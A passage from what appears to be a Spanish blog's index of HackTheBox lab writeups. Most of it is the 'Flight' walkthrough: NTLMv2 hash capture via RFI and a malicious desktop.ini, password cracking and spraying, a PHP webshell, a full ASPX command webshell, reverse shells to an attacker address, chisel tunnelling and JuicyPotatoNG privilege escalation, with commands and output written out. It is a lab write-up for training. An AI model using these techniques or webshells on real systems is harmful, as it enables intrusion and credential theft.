C:\\Users\\Administrator\\Documents&gt; whoamisequel\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Procedemos a leer la flag.*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ../Desktop/root.txt146a3dc7812a7b839f482285b6701f3b*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; ERROLOG.BAK"
  },
  
  {
    "title": "Interface WriteUp",
    "url": "/posts/interface-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, medium, RCE",
    "date": "2023-03-31 18:00:00 +0200",
    





    "snippet": "Interface es una máquina de HackTheBox con una dificultad media. Para acceder usaremos una CVE de  la herramienta dompdf  que cuenta con un RCE y para la escalada nos aprovecharemos de una tarea cron que nos permite poner la bash con permiso SUID.EnumeraciónEscaneo de puertosEmpezamos con un escaneo nmap.❯ nmap 10.10.11.200Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 00:29 -04Nmap scan report for prd.m.rendering-api.interface.htb (10.10.11.200)Host is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 2.62 secondsSi intentamos ver la página webSitio en manteniminetoSi aplicamos fuzzing no encontramos nada, así que probaremos con burpsuite_Burp SuiteSi agregamos ese dominio al /etc/passwdecho '10.10.11.200       http://prd.m.rendering-api.interface.htb'  | tee -a /etc/hostsSi le aplicamos un curl nos dira que el código de estado es 404.❯ curl -i http://prd.m.rendering-api.interface.htbHTTP/1.1 404 Not FoundServer: nginx/1.14.0 (Ubuntu)Date: Sat, 01 Apr 2023 04:49:09 GMTContent-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedConnection: keep-aliveFile not found.Aplicamos Fuzzing.❯ wfuzz -c  --hh=182 -t 300 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://prd.m.rendering-api.interface.htb/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://prd.m.rendering-api.interface.htb/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000001467:   403        1 L      2 W        15 Ch       \"vendor\"                                                                                                               IntrusiónCVE-2022-28368Escalada de privilegios"
  },
  
  {
    "title": "Agile WriteUp",
    "url": "/posts/agile-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy",
    "date": "2023-03-31 18:00:00 +0200",
    





    "snippet": ""
  },
  
  {
    "title": "Flight WriteUp",
    "url": "/posts/fligth-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "windows, hard, lfi, rfi, DC, virtual hosting, user pivoting, RunasCs.exe, JuicePotatoNG, web shell, Doma",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "BioEnumeraciónNMAP ScanRealizando un NMAP Scan vemos.❯ nmap 10.10.11.187Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 18:55 -04Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 0.80% doneNmap scan report for 10.10.11.187Host is up (0.15s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE53/tcp   open  domain80/tcp   open  http88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPsslViendo los puertos 53 y 88 me indican que es un DCMirando el servidor vemos un dominio.❯ curl -s 10.10.11.187 | html2text | tail -n3Copyright 2022 flight.htb - All Rights ReservedDesigned by Geiseric &amp; JDgoddlo añadimos al /etc/hosts❯ echo '10.10.11.187    flight.htb' | tee -a /etc/hosts10.10.11.187    flight.htbAl aplicar FUZZING no vemos nada interesante, buscamos subdominios❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -t 300 -u flight.htb 2&gt;/dev/null===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://flight.htb[+] Method:       GET[+] Threads:      300[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/04/06 19:10:12 Starting gobuster in VHOST enumeration mode===============================================================Found: school.flight.htb (Status: 200) [Size: 3996]===============================================================2023/04/06 19:10:25 Finished===============================================================Lo añadimos al /etc/hosts….Haciendo hovering sobre las pestañas vemos que lee el archivo por el parametro view?=ImageIntrusiónEsto huele a LFI, En lugar de intentar leer archivos podemos realizar un RFI a un servidor SMB loca, estó realizará una autenticación y nos mostrará el hash NTLMv2 del usuario que corre el servicio.Nos creamos un servidor SMB con soporte para la versión 2.❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedMediante una petición obtendremos el Hash NTLMv2.curl -s \"http://school.flight.htb/?view=//10.10.14.97/pwned\"Y lo veremos frente a nuestros ojos.❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.187,52807)[*] AUTHENTICATE_MESSAGE (flight\\svc_apache,G0)[*] User G0\\svc_apache authenticated successfully[*] svc_apache::flight:aaaaaaaaaaaaaaaa:62e323993fba7b01d7444bf4bdcc6c5b:01010000000000008075c293e368d901efb22a5fac2b3e9100000000010010004a00410054004e007800450056007600030010004a00410054004e0078004500560076000200100078005900700076006a0068006b0067000400100078005900700076006a0068006b006700070008008075c293e368d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000[*] Closing down connection (10.10.11.187,52807)[*] Remaining connections []Lo copiamos en un fichero y lo intentamos crakear.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusS@Ss!K@*t13      (svc_apache)1g 0:00:00:11 DONE (2023-04-06 19:59) 0.09041g/s 964189p/s 964189c/s 964189C/s SADSAM..S42150461Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completedMediante crackmapexec podemos ver que son correctas.❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)SMB         10.10.11.187    445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 Podemos intentar dumpear los usuarios.❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --usersSMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)SMB         10.10.11.187    445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)SMB         10.10.11.187    445    G0               flight.htb\\O.Possum                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\svc_apache                     badpwdcount: 0 baddpwdtime: 2023-04-07 07:01:10.196129+00:00SMB         10.10.11.187    445    G0               flight.htb\\V.Stevens                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\D.Truff                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\I.Francis                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\W.Walker                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\C.Bum                          badpwdcount: 0 baddpwdtime: 2023-04-06 12:17:59.474129+00:00SMB         10.10.11.187    445    G0               flight.htb\\M.Gold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\L.Kein                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\G.Lors                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\R.Cold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\S.Moon                         badpwdcount: 2 baddpwdtime: 2023-04-06 12:41:47.520073+00:00SMB         10.10.11.187    445    G0               flight.htb\\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00SMB         10.10.11.187    445    G0               flight.htb\\Administrator                  badpwdcount: 0 baddpwdtime: 2022-11-01 02:58:04.270580+00:00Copiamos todos los usuarion y probaremos un ataque de fuerza bruta para ver si alguie reutiliza la contraseña.  El archivo users cuenta con los nombres de usuario que se encuantra en disponible.  el parametro continue-on-success nos permitira que ignore los matches y continue hasta terminar.❯ crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-successSMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)SMB         10.10.11.187    445    G0               [-] flight.htb\\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 SMB         10.10.11.187    445    G0               [-] flight.htb\\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 SMB         10.10.11.187    445    G0               [-] flight.htb\\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         10.10.11.187    445    G0               [-] flight.htb\\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE El usuario S.Moon reutiliza la contraseña, pésima opción. Procedemos a ver sus directorios compartidos. Necesitamos uno en el cual podamos escribir.❯ crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --sharesSMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)SMB         10.10.11.187    445    G0               [+] flight.htb\\S.Moon:S@Ss!K@*t13 SMB         10.10.11.187    445    G0               [+] Enumerated sharesSMB         10.10.11.187    445    G0               Share           Permissions     RemarkSMB         10.10.11.187    445    G0               -----           -----------     ------SMB         10.10.11.187    445    G0               ADMIN$                          Remote AdminSMB         10.10.11.187    445    G0               C$                              Default shareSMB         10.10.11.187    445    G0               IPC$            READ            Remote IPCSMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share SMB         10.10.11.187    445    G0               Shared          READ,WRITE      SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share SMB         10.10.11.187    445    G0               Users           READ            SMB         10.10.11.187    445    G0               Web             READ            Nos conectamos por smbclient , pero…….. no vemos nada, pero tenemos permiso de escritura.❯ smbclient //10.10.11.187/Shared -U S.Moon --password 'S@Ss!K@*t13'Try \"help\" to get a list of possible commands.smb: \\&gt; dir  .                                   D        0  Fri Apr  7 03:13:45 2023  ..                                  D        0  Fri Apr  7 03:13:45 2023\t\t5056511 blocks of size 4096. 1174738 blocks availablesmb: \\&gt; Creamos un archivo malicioso desktop.ini siguiendo la guía de HackTricks.❯ echo '[.ShellClassInfo]' &gt; desktop.ini❯ echo IconResource=\\\\10.10.14.97\\pwned &gt;&gt; desktop.iniCreamos otro servidor smb….❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedSubimos nuestro archivo maliciososmb: \\&gt; put desktop.iniputting file desktop.ini as \\desktop.ini (0,1 kb/s) (average 0,1 kb/s)smb: \\&gt; Esperamos unos minutos hasta que el usuario haga click en el archivo y nos llegará el hash NTLMv2❯ impacket-smbserver pwned  . -smb2supportImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.11.187,52884)[*] AUTHENTICATE_MESSAGE (flight.htb\\c.bum,G0)[*] User G0\\c.bum authenticated successfully[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:0655e313d46e69ab9af3c1b5f235a237:01010000000000000071af45e768d90189f5ed66e4153edb00000000010010004e006d006900720051004d004b004300030010004e006d006900720051004d004b00430002001000510055006800770069004d004f004d0004001000510055006800770069004d004f004d00070008000071af45e768d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000[*] Closing down connection (10.10.11.187,52884)[*] Remaining connections []Volvemos a crakearlo.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusTikkycoll_431012284 (c.bum)1g 0:00:00:07 DONE (2023-04-06 20:25) 0.1270g/s 1338Kp/s 1338Kc/s 1338KC/s TinyMutt69..Tiffani29Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completedConseguimos la contraseña de C.Bum. Listamos si tenemos un recurso con permiso de escritura.❯ crackmapexec smb 10.10.11.187 -u C.Bum -p 'Tikkycoll_431012284' --sharesSMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)SMB         10.10.11.187    445    G0               [+] flight.htb\\C.Bum:Tikkycoll_431012284 SMB         10.10.11.187    445    G0               [+] Enumerated sharesSMB         10.10.11.187    445    G0               Share           Permissions     RemarkSMB         10.10.11.187    445    G0               -----           -----------     ------SMB         10.10.11.187    445    G0               ADMIN$                          Remote AdminSMB         10.10.11.187    445    G0               C$                              Default shareSMB         10.10.11.187    445    G0               IPC$            READ            Remote IPCSMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share SMB         10.10.11.187    445    G0               Shared          READ,WRITE      SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share SMB         10.10.11.187    445    G0               Users           READ            SMB         10.10.11.187    445    G0               Web             READ,WRITE      Vemos que en Shares y en Web, entramos con smbclient.❯ smbclient //10.10.11.187/Web -U C.Bum --password 'Tikkycoll_431012284'Try \"help\" to get a list of possible commands.smb: \\&gt; dir  .                                   D        0  Fri Apr  7 03:29:21 2023  ..                                  D        0  Fri Apr  7 03:29:21 2023  flight.htb                          D        0  Fri Apr  7 03:27:01 2023  school.flight.htb                   D        0  Fri Apr  7 03:27:01 2023\t\t5056511 blocks of size 4096. 1174531 blocks availablesmb: \\&gt; Subimos una WebShell.php podemos usar esta.| Nota: Es posble que tengas que subir mas de una, ya que al cabo de unos segundos se elimina.smb: \\&gt; cd flight.htb\\smb: \\flight.htb\\&gt; put webshell.phpputting file webshell.php as \\flight.htb\\webshell.php (15,5 kb/s) (average 10,3 kb/s)smb: \\flight.htb\\&gt; Abrimos la WebShell….Web ShellCreamos una carpeta en C:\\….Web ShellProcedemos a descargar netcat, pero primero creamos un servidor python❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Web SHellAhora lo ejecutamos..Web SHellComo vemos nos llega la shell.❯ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.97] from (UNKNOWN) [10.10.11.187] 53036Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\xampp\\htdocs\\flight.htb&gt; Pero somos svc_apache.PS C:\\xampp\\htdocs\\flight.htb&gt; whoamiwhoamiflight\\svc_apachePS C:\\xampp\\htdocs\\flight.htb&gt; Movimientos lateralesTenemos la contraseña de C.Bum podemos probarlas con RunasCs.exe, la descargamos de aquí.  By ChatGPT: “RunasCs.exe” es un archivo ejecutable que se utiliza para iniciar una aplicación de consola de Windows con privilegios elevados. La herramienta “runas” se usa para ejecutar programas con permisos de administrador o de otro usuario en Windows. “RunasCs.exe” es una versión personalizada de la herramienta “runas” que puede ejecutar scripts de PowerShell desde una consola de Windows con permisos elevados.  En resumen, “RunasCs.exe” es un archivo ejecutable que se utiliza para ejecutar aplicaciones con permisos elevados en una consola de Windows y, en particular, es útil para ejecutar scripts de PowerShell con permisos de administrador o de otro usuario. Es importante tener cuidado al usar esta herramienta y solo ejecutar archivos de fuentes confiables, ya que puede ser potencialmente peligroso si se usa incorrectamente.Ya saben.  servidor pythonDescargamos el archivo…PS C:\\xampp\\htdocs\\flight.htb&gt; curl 10.10.14.97/RunasCs.exe -o RunasCs.execurl 10.10.14.97/RunasCs.exe -o RunasCs.exePS C:\\xampp\\htdocs\\flight.htb&gt; Nos ponemos en escucha de nuevo.❯ nc -lvnp 443listening on [any] 443 ...Y ejecutamos…..PS C:\\xampp\\htdocs\\flight.htb&gt; .\\RunasCs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.14.97:443.\\RunasCs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.14.97:443[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\\Desktop: Service-0x0-5cb14$\\Default[+] Async process 'powershell' with pid 3692 created and left in background.PS C:\\xampp\\htdocs\\flight.htb&gt; Ahora recibimos la shell como C.Bum.PS C:\\Windows\\system32&gt; whoamiwhoamiflight\\c.bumPS C:\\Windows\\system32&gt; Procedemos a leer la primera flag.PS C:\\Windows\\system32&gt; type C:\\Users\\C.Bum\\Desktop\\user.txttype C:\\Users\\C.Bum\\Desktop\\user.txt87****************************1cPS C:\\Windows\\system32&gt; Escalada de privilegiosViendo puertos abiertos vemos este puerto.PS C:\\Windows\\system32&gt; netstat -oatnetstat -oatActive Connections  Proto  Local Address          Foreign Address        State           PID      Offload State  TCP    0.0.0.0:80             g0:0                   LISTENING       4752\tInHost        TCP    0.0.0.0:88             g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:135            g0:0                   LISTENING       920\tInHost        TCP    0.0.0.0:389            g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:443            g0:0                   LISTENING       4752\tInHost        TCP    0.0.0.0:445            g0:0                   LISTENING       4\tInHost        TCP    0.0.0.0:464            g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:593            g0:0                   LISTENING       920\tInHost        TCP    0.0.0.0:636            g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:3268           g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:3269           g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:5985           g0:0                   LISTENING       4\tInHost        TCP    0.0.0.0:8000           g0:0                   LISTENING       4\tInHost        TCP    0.0.0.0:9389           g0:0                   LISTENING       2744\tInHost        TCP    0.0.0.0:47001          g0:0                   LISTENING       4\tInHost        TCP    0.0.0.0:49664          g0:0                   LISTENING       504\tInHost        TCP    0.0.0.0:49665          g0:0                   LISTENING       1096\tInHost        TCP    0.0.0.0:49666          g0:0                   LISTENING       1508\tInHost        TCP    0.0.0.0:49667          g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:49673          g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:49674          g0:0                   LISTENING       652\tInHost        TCP    0.0.0.0:49682          g0:0                   LISTENING       644\tInHost        TCP    0.0.0.0:49694          g0:0                   LISTENING       2908\tInHost        TCP    0.0.0.0:49723          g0:0                   LISTENING       2852\tInHost        TCP    10.10.11.187:53        g0:0                   LISTENING       2908\tInHost       Usando chisel haremos port forwarding.En nuestra máquina ejecutamos como  server.❯ ./chisel server --reverse --port 90002023/04/06 22:30:23 server: Reverse tunnelling enabled2023/04/06 22:30:23 server: Fingerprint LGzxnAs5dUDkv0yw4j1oqcFpt3BfrUxc2Ohet8a6KWM=2023/04/06 22:30:23 server: Listening on http://0.0.0.0:9000Lo descargamos en Windows.PS C:\\Windows\\system32&gt; cd C:\\SxZkDcd C:\\SxZkDPS C:\\SxZkD&gt; curl 10.10.14.97/chisel.exe -o chisel.execurl 10.10.14.97/chisel.exe -o chisel.exePS C:\\SxZkD&gt; lsls    Directory: C:\\SxZkDMode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  -a----         4/7/2023   2:28 AM        8676864 chisel.exe                                                            -a----         4/7/2023   1:06 AM          45272 nc.exe                                                                PS C:\\SxZkD&gt;En la máquina Windows lo ejecutamos como cliente.PS C:\\SxZkD&gt; .\\chisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000.\\chisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000No damos cuanta que la web está hecha con ASP.NET, así que podemos subir una reverse shell .aspx.Si miramos la raiz de la carpeta veremos…..PS C:\\Windows\\system32&gt; cd ../..cd ../..PS C:\\&gt; lsls    Directory: C:\\Mode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  d-----         4/7/2023   2:07 AM                inetpub                                                               d-----         6/7/2022   6:39 AM                PerfLogs                                                              d-r---       10/21/2022  11:49 AM                Program Files                                                         d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   d-----         4/7/2023  12:29 AM                Shared                                                                d-----        9/22/2022  12:28 PM                StorageReports                                                        d-----         4/7/2023   1:06 AM                SxZkD                                                                 d-r---        9/22/2022   1:16 PM                Users                                                                 d-----       10/21/2022  11:52 AM                Windows                                                               d-----        9/22/2022   1:16 PM                xampp                                                                 PS C:\\&gt; La carpeta inetpub no es casual, veremos su contenido.PS C:\\&gt; cd inetpubcd inetpubPS C:\\inetpub&gt; dirdir    Directory: C:\\inetpubMode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  d-----        9/22/2022  12:24 PM                custerr                                                               d-----         4/7/2023   2:12 AM                development                                                           d-----        9/22/2022   1:08 PM                history                                                               d-----        9/22/2022  12:32 PM                logs                                                                  d-----        9/22/2022  12:24 PM                temp                                                                  d-----        9/22/2022  12:28 PM                wwwroot                                                               PS C:\\inetpub&gt; cd developmentcd developmentPS C:\\inetpub\\development&gt; Usando este repo crearemos nuestra cmd.aspx  Aquí te lo comparto.&lt;%@ Page Language=\"VB\" Debug=\"true\" %&gt;&lt;%@ import Namespace=\"system.IO\" %&gt;&lt;%@ import Namespace=\"System.Diagnostics\" %&gt;&lt;script runat=\"server\"&gt;      Sub RunCmd(Src As Object, E As EventArgs)              Dim myProcess As New Process()              Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)              myProcessStartInfo.UseShellExecute = false              myProcessStartInfo.RedirectStandardOutput = true              myProcess.StartInfo = myProcessStartInfo              myProcessStartInfo.Arguments=xcmd.text              myProcess.Start()              Dim myStreamReader As StreamReader = myProcess.StandardOutput              Dim myString As String = myStreamReader.Readtoend()              myProcess.Close()              mystring=replace(mystring,\"&lt;\",\"&amp;lt;\")              mystring=replace(mystring,\"&gt;\",\"&amp;gt;\")              result.text= vbcrlf &amp; \"&lt;pre&gt;\" &amp; mystring &amp; \"&lt;/pre&gt;\"    End Sub&lt;/script&gt;&lt;html&gt;&lt;body&gt;    &lt;form runat=\"server\"&gt;        &lt;p&gt;&lt;asp:Label id=\"L_p\" runat=\"server\" width=\"80px\"&gt;Program&lt;/asp:Label&gt;        &lt;asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\"&gt;c:\\windows\\system32\\cmd.exe&lt;/asp:TextBox&gt;        &lt;p&gt;&lt;asp:Label id=\"L_a\" runat=\"server\" width=\"80px\"&gt;Arguments&lt;/asp:Label&gt;        &lt;asp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\"&gt;/c net user&lt;/asp:TextBox&gt;        &lt;p&gt;&lt;asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"&gt;&lt;/asp:Button&gt;        &lt;p&gt;&lt;asp:Label id=\"result\" runat=\"server\"&gt;&lt;/asp:Label&gt;       &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;Lo descargamos…PS C:\\inetpub\\development&gt; curl 10.10.14.97/cmd.aspx -o cmd.aspxcurl 10.10.14.97/cmd.aspx -o cmd.aspxPS C:\\inetpub\\development&gt; CMD.aspxNos enviamos una shell con netcat.Reverse ShellNos ponemos en escucha y nos llega la shell.❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.97] from (UNKNOWN) [10.10.11.187] 53554Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.PS C:\\windows\\system32\\inetsrv&gt; Si listamos nuiestros privilegios veremos.PS C:\\windows\\system32\\inetsrv&gt; whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State   ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token             DisabledSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        DisabledSeMachineAccountPrivilege     Add workstations to domain                DisabledSeAuditPrivilege              Generate security audits                  DisabledSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled SeImpersonatePrivilege        Impersonate a client after authentication Enabled SeCreateGlobalPrivilege       Create global objects                     Enabled SeIncreaseWorkingSetPrivilege Increase a process working set            DisabledPS C:\\windows\\system32\\inetsrv&gt; El privilegio SeImpersonatePrivilege nos llama la atención. Usando JuicyPotatoNG. Lo descargamosPS C:\\SxZkD&gt; curl 10.10.14.97/JuicyPotatoNG.exe -o JP.execurl 10.10.14.97/JuicyPotatoNG.exe -o JP.exePS C:\\SxZkD&gt; Cuando lo ejecutemos le decimos que nos otorgue una cmd y entrar en modo interactivo..\\JP.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -i¿Estan listo?PS C:\\SxZkD&gt; .\\JP.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -i.\\JP.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -iMicrosoft Windows [Version 10.0.17763.2989](c) 2018 Microsoft Corporation. All rights reserved.C:\\&gt;C:\\&gt;whoamiwhoamint authority\\systemC:\\&gt;Procedemos a leer la flag.C:\\&gt;type C:\\Users\\Administrator\\Desktop\\root.txttype C:\\Users\\Administrator\\Desktop\\root.txt97****************************fbC:\\&gt;¿Qué te parecio?"
  },
  
  {
    "title": "Stocker WriteUp",
    "url": "/posts/stocker-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…Sale muy pronto"
  },
  
  {
    "title": "Soccer WriteUp",
    "url": "/posts/soccer-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-23 17:00:00 +0100",
    





    "snippet": "Proximamente…Sale proximante por el 12 -30 de abril…"
  },
  
  {
    "title": "Investigation WriteUp",
    "url": "/posts/investigation-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-22 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "BroScience WriteUp",
    "url": "/posts/broscience-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "medium, linux, writeup, hackthebox, directory transversal, SSL certificate, cookie, Postgresql",
    "date": "2023-03-21 17:00:00 +0100",
    





